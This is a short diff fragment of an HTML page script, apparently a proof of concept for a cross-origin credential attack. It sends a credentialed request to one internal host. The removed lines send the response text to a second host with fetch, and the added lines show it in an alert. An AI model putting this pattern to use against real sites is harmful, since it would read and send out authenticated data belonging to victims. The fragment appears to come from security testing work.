@@ -8,8 +8,8 @@ xmlhttp=new XMLHttpRequest();
 xmlhttp.open("GET","http://172.16.1.65/");
 xmlhttp.withCredentials = true;
 //var str=xmlhttp.getAllResponseHeaders();
-var str1 = xmlhttp.responseText();
-fetch("http://172.16.1.60/"+str1);
+var str1 = xmlhttp.responseText;
+alert(str1);
 }
 </script>
 </head>
